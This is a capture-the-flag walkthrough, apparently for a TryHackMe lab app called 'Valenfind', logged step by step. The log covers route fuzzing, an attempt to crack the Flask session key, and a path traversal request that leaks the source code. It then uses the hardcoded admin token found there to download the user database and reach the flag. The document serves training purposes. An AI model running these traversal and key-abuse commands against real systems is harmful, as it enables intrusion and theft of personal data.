@@ -1,0 +1,221 @@
+2026-02-16 17:40:25 EST -- START TIME
+//Valenfind
+--------------------------------------
+
+My Dearest Hacker,
+There’s this new dating app called “Valenfind” that just popped up out of nowhere. I hear the creator only learned to code this year; surely this must be vibe-coded. Can you exploit it?
+
+You can access it here: http://$ip:5000
+
+2026-02-16 18:00:48 EST -- 
+//0) Goal and initial context
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+Target: http://10.65.183.114:5000
+Clue: “vibe-coded” dating app → expect common web mistakes (auth bugs, LFI, hardcoded keys, insecure file reads).
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+2026-02-16 18:48:32 EST -- 
+//1) Identify tech stack (fingerprint)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+Command
+curl -i http://10.65.183.114:5000/
+
+
+What to look for
+Server: Werkzeug/3.0.1 Python/3.12.3 → strongly indicates Flask (Werkzeug is Flask’s dev/prod server toolkit).
+
+Basic routes shown in navbar: /login, /register
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+2026-02-16 18:50:52 EST -- 
+//2) Enumerate routes (find hidden endpoints)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+ffuf -u http://10.65.183.114:5000/FUZZ \
+  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+  -fc 404 -fs 0
+
+/login (200)
+/register (200)
+/dashboard (302 redirect — likely requires auth)
+/logout (302)
+
+Why this matters
+
+With only a few endpoints, the vuln is likely behind login (dashboard/profile features).
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+2026-02-16 18:52:41 EST -- 
+//3) Register & capture session cookie (confirm auth + session type)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+Register an account via browser at:
+
+http://10.65.183.114:5000/register
+
+After registration/login, copy your session cookie (from browser devtools or Burp).
+
+Example cookie I had:
+
+session=eyJsaWtlZCI6W10sInVzZXJfaWQiOjksInVzZXJuYW1lIjoiZ2gwNXQifQ.aZOeRQ.31jTTkSCnms0fNdR8kvL9PZyXms
+
+Confirm access dashboard with cookie
+
+curl -i -b "session=eyJsaWtlZCI6W10sInVzZXJfaWQiOjksInVzZXJuYW1lIjoiZ2gwNXQifQ.aZOeRQ.31jTTkSCnms0fNdR8kvL9PZyXms" http://10.65.183.114:5000/dashboard
+
+HTTP/1.1 200 OK and HTML showing “Potential Matches Near You”
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//4) Initial hypothesis: Flask session forging (and why it failed)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+My cookie decoded to:
+
+{"liked":[],"user_id":9,"username":"gh05t"}
+
+
+Because Flask stores session data client-side (signed), a common attack is:
+
+Crack SECRET_KEY → forge admin session.
+
+Attempt crack with flask-unsign
+
+2026-02-16 18:57:59 EST -- 
+flask-unsign --unsign \
+  --cookie 'eyJsaWtlZCI6W10sInVzZXJfaWQiOjksInVzZXJuYW1lIjoiZ2gwNXQifQ.aZOeRQ.31jTTkSCnms0fNdR8kvL9PZyXms' \
+  --wordlist /usr/share/wordlists/rockyou.txt \
+  --no-literal-eval
+
+//It ran through ~14M attempts and failed.
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//5) Find the real vuln via profile view (client-side script leak)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+Open public profile:
+
+http://10.65.183.114:5000/profile/gh05t
+
+I inserted {{7*7}} in bio expecting SSTI.
+Instead, the page showed a JavaScript block revealing the actual bug.
+
+Key evidence from the HTML/JS
+
+In the profile page I saw:
+
+// Feature: Dynamic Layout Fetching
+// Vulnerability: 'layout' parameter allows LFI
+fetch(`/api/fetch_layout?layout=${layoutName}`)
+
+
+And it loads:
+
+theme_classic.html
+theme_modern.html
+theme_romance.html
+
+This is the pivot.
+
+The app is fetching “layout files” based on a user-controlled query parameter. That’s classic LFI / path traversal.
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//6) Exploit LFI to read server files (app source disclosure)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+Test LFI by traversing out of the intended folder.
+
+Read the application source (app.py)
+
+Command
+
+curl "http://10.65.183.114:5000/api/fetch_layout?layout=../../app.py"
+
+
+Why ../../app.py worked
+
+The backend builds a path like:
+
+templates/components/<layout>
+
+Using ../../ escapes templates/components/ back to project root.
+
+What you gained
+
+Full Flask source code.
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//7) Extract hardcoded admin key + find admin endpoint (from source)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+Inside app.py I found:
+
+ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
+
+
+And an admin-only route:
+
+@app.route('/api/admin/export_db')
+def export_db():
+    auth_header = request.headers.get('X-Valentine-Token')
+    if auth_header == ADMIN_API_KEY:
+        return send_file(DATABASE, as_attachment=True, download_name='valenfind_leak.db')
+
+
+If you send the header:
+
+X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO
+You can download the SQLite database
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//8) Abuse admin endpoint to exfiltrate the database
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
+     http://10.65.183.114:5000/api/admin/export_db \
+     -o valenfind_leak.db
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//9) Open the SQLite DB and locate the flag
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+sqlite3 valenfind_leak.db
+
+
+Inside sqlite:
+
+.tables
+SELECT * FROM users;
+
+
+Where the flag was
+User cupid had the flag in the address field:
+
+//FLAG: THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//FLAG: THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
+
+
+2026-02-16 19:15:40 EST -- COMPLETE
+
